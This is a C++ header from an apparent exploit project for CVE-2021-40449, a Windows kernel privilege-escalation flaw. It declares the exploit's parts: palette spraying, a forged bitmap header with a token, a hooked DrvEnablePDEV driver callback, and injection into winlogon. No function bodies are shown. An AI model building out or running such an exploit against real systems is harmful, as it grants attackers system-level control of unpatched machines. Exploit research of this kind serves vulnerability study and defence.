/*
 * @Date: 2026-11-03 15:42:04
 * @LastEditors: joe1sn joe1sn23333@gmail.com
 * @LastEditTime: 2026-11-03 15:45:04
 * @FilePath: \panicake\exp\CVE_2021_40449\exp.hpp
 */
#pragma once
#define WIN32_LEAN_AND_MEAN
#include "def.hpp"
#include "include/common/gadget.hpp"
#include "include/common/memtools.hpp"
#include <vector>
#include <tlhelp32.h>

namespace CVE_2021_40449
{
    inline bool trigger = false;
    inline HDC pocHDC;

    VOID InjectToWinlogon();
    VOID EXPSprayPalettes(DWORD size);
    DWORD64 CreateForgedBitMapHeader(DWORD64 token);
    DHPDEV EXPhook_DrvEnablePDEV(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);

    bool Exp();
} // namespace CVE_2021_40449